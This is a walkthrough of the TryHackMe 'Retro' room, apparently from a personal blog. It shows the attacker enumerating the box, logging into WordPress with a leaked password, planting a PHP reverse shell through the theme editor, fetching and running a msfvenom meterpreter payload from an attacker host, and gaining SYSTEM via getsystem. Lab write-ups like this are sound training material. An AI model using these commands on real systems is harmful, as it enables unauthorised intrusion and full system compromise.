---
layout: default
title: Retro
description: THM - Retro
---

## Enumeration
Nmap:
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 20:18 EEST
Nmap scan report for 10.10.190.35
Host is up (0.067s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.00 seconds
```
Gobuster:
```
/retro
/retro/wp-content
/retro/wp-includes
/retro/wp-login.php
```
From the gobuster results, we figure that the website is running on wordpress.
The host OS is windows, so we may need to look into some powershell later on.

Let's take a look at the website. CTF creators like to hide things in plain sight.

We click on "Wade" and we have all his posts and comments.

Let's read through some posts.

Alright, found nothing, but there was a single comment.

![image](https://github.com/TudM99/tudm99.github.io/blob/main/images/retro_01.png)

Let's try logging into wordpress with that word as a password, and I'll try a few usernames like wade, admin, etc.

And we're in!

Now we'll use the good ol' theme editor to get a reverse shell on the system.

I'll use Twenty Seventeen, with a php shell from Ivan Sincek, but you can go ahead and experiment. Replace the 404.php content with your shell, and launch it.


```
10.10.190.35/retro/wp-content/themes/twentyseventeen/404.php
```
```
nc -lvnp 9002
Listening on 0.0.0.0 9002
Connection received on 10.10.190.35 49854
SOCKET: Shell has connected! PID: 1864
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\retro\wp-content\themes\twentyseventeen>

```
Great! We have a shell. Let's look around for interesting files, and write permissions.

First of all, I'll pop into powershell since I find it easier to navigate with.
```
PS C:\Users> cd Wade
PS C:\Users\Wade> ls
ls : Access to the path 'C:\Users\Wade' is denied.
At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Wade:String) [Get-Ch 
   ildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell. 
   Commands.GetChildItemCommand
 
PS C:\Users\Wade> 

```
I tried accessing the "Wade" folder, but my access is denied. Same story with the admin folder.

This being a Windows machine, most likely we'll have write access to the public folders. Let's give it a go.

First, I'll generate an msfvenom payload for a reverse_tcp connection.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.18.116.220 LPORT=9003 -f exe -o reverse.exe
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.18.116.220; set lport 9003; exploit"
```
And now, with a python http server open, let's try to download and execute the "reverse.exe" file
```
PS C:\Users\Public> $url = "http://10.18.116.220:8000/reverse.exe"
PS C:\Users\Public> $outpath = "C:/Users/Public/reverse.exe"
PS C:\Users\Public> Invoke-WebRequest -Uri $url -OutFile $outpath
PS C:\Users\Public> ls


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-r---        12/8/2019  10:49 PM                Documents                     
d-r---        7/16/2016   6:23 AM                Downloads                     
d-r---        7/16/2016   6:23 AM                Music                         
d-r---        7/16/2016   6:23 AM                Pictures                      
d-r---        7/16/2016   6:23 AM                Videos                        
-a----        9/23/2023  10:42 AM           7168 reverse.exe                   


PS C:\Users\Public>

```

Good, we now have our payload on the machine. Let's try running it.
```
PS C:\Users\Public> .\reverse.exe

payload => windows/x64/meterpreter/reverse_tcp
lhost => 10.18.116.220
lport => 9003
[*] Started reverse TCP handler on 10.18.116.220:9003 
[*] Sending stage (200774 bytes) to 10.10.190.35
[*] Meterpreter session 1 opened (10.18.116.220:9003 -> 10.10.190.35:49874) at 2023-09-23 20:43:39 +0300

meterpreter > getuid
Server username: IIS APPPOOL\retro
meterpreter > 

```
Nice, we have a meterpreter shell.

## Privilege Escalation:

We'll use the default meterpreter "getsystem" command.
```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
We now have system privileges. We can read both flags and submit them!

Good hunting o7

[Try it out yourself!](https://tryhackme.com/room/retro)

[back](./)
